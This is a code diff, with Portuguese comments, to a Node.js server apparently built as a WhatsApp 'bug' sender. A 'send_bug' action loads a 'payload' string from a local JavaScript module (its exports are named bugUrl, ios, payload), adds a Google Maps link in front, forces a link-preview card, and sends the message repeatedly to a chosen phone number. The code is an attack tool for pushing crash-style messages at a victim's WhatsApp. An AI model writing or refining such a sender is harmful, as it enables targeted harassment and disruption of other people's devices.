@@ -141,41 +141,53 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo focado na importação de Módulos JavaScript (.js)
+                // Disparo focado em Módulos JS com suporte ao Card do Google Maps
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivo = extraData.file;
                     const quantidade = parseInt(extraData.amount) || 1;
 
-                    let payloadText = "https://maps.google.com/maps?q=0,0\n⚠️ Payload ZRX";
+                    let conteudoPayload = "⚠️ Payload ZRX";
 
                     try {
-                        // Trata a extensão para fazer o require correto do arquivo .js
                         const nomeModulo = nomeArquivo.replace(/\.js$/, '');
                         const caminhoAbsoluto = path.join(__dirname, `${nomeModulo}.js`);
 
                         if (fs.existsSync(caminhoAbsoluto)) {
-                            // Limpa o cache para sempre carregar atualizações do módulo
                             delete require.cache[require.resolve(`./${nomeModulo}`)];
                             const modulo = require(`./${nomeModulo}`);
 
                             if (typeof modulo === 'string') {
-                                payloadText = modulo;
+                                conteudoPayload = modulo;
                             } else if (typeof modulo === 'object' && modulo !== null) {
-                                // Puxa a variável exportada no arquivo JS (bugUrl, ios, payload, etc)
-                                payloadText = modulo.bugUrl || modulo.ios || modulo.payload || modulo.default || Object.values(modulo)[0] || payloadText;
+                                conteudoPayload = modulo.bugUrl || modulo.ios || modulo.payload || modulo.default || Object.values(modulo)[0] || conteudoPayload;
                             }
                         }
                     } catch (err) {
                         console.error("Erro ao importar o módulo .js:", err.message);
                     }
 
+                    // Se o conteúdo importado já não começar com o link do mapa, nós encabeçamos para garantir o card
+                    const urlMapa = "https://maps.google.com/maps?q=0,0";
+                    let textoFinal = conteudoPayload;
+
+                    if (!conteudoPayload.startsWith('http')) {
+                        textoFinal = `${urlMapa}\n${conteudoPayload}`;
+                    }
+
                     for (let i = 0; i < quantidade; i++) {
-                        // Enviamos a string direta carregada do módulo JS.
-                        // O motor nativo do WhatsApp lerá a primeira linha (URL) e gerará o card do mapa.
-                        await waSock.sendMessage(targetJid, { text: payloadText });
+                        // Força a estrutura de pré-visualização do Google Maps no Baileys
+                        await waSock.sendMessage(targetJid, { 
+                            text: textoFinal,
+                            linkPreview: {
+                                "canonical-url": urlMapa,
+                                "matched-text": urlMapa,
+                                "title": "Google Maps",
+                                "description": "Localização",
+                                "doNotAttachThumbnail": false
+                            }
+                        });
                         
-                        // Intervalo fixo de 3 segundos para evitar o bug de sincronização criptográfica
                         await delay(3000);
                     }
 
